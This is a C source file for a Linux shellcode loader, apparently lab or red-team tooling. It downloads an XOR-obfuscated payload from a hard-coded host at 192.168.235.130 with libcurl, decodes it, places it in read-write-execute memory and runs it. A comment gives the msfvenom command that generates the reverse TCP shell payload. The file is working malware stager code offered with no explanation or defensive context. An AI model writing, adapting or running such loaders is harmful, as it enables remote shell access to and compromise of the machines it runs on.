#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/mman.h>

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.235.130 LPORT=8443 -f raw -o shellcode.bin
#define SHELLCODE_URL "http://192.168.235.130:8000/beacons/agent.xor.bin"
#define XOR_KEY       "vns69"

struct MemoryStruct {
    unsigned char *memory;
    size_t size;
};

static size_t WriteMemoryCallback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct *mem = (struct MemoryStruct *)userp;

    unsigned char *ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) {
        printf("Error: not enough memory\n");
        return 0;
    }

    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;

    return realsize;
}

int main(int argc, char **argv) {
    CURL *curl;
    CURLcode res;

    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();

    if (!curl) {
        fprintf(stderr, "Error: curl init failed\n");
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);

    res = curl_easy_perform(curl);

    if (res != CURLE_OK) {
        fprintf(stderr, "Error fetching shellcode: %s\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        return 1;
    }

    curl_easy_cleanup(curl);
    curl_global_cleanup();

    // XOR decode in-place
    int key_len = strlen(XOR_KEY);
    for (size_t i = 0; i < chunk.size; i++) {
        chunk.memory[i] ^= XOR_KEY[i % key_len];
    }

    // Allocate RWX memory
    void *exec_mem = mmap(
        NULL,
        chunk.size,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANON | MAP_PRIVATE,
        -1,
        0
    );

    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        free(chunk.memory);
        return 1;
    }

    // Copy decoded shellcode into executable memory
    memcpy(exec_mem, chunk.memory, chunk.size);
    free(chunk.memory);

    // Execute shellcode
    ((void(*)())exec_mem)();

    // Cleanup (likely never reached)
    munmap(exec_mem, chunk.size);
    return 0;
}
